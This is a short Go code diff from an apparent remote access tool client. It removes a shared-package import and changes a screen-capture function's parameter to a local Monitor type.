@@ -13,7 +13,7 @@ import "C"
 import (
 	"image"
 	"rat/client/log"
-	"rat/shared"
+
 	"unsafe"
 )
 
@@ -33,7 +33,7 @@ func CaptureWindow(handle int) image.Image {
 	return handleImage(cap)
 }
 
-func Capture(monitor shared.Monitor) image.Image {
+func Capture(monitor Monitor) image.Image {
 	m := cMonitor(monitor)
 
 	image := C.CaptureMonitor(m)
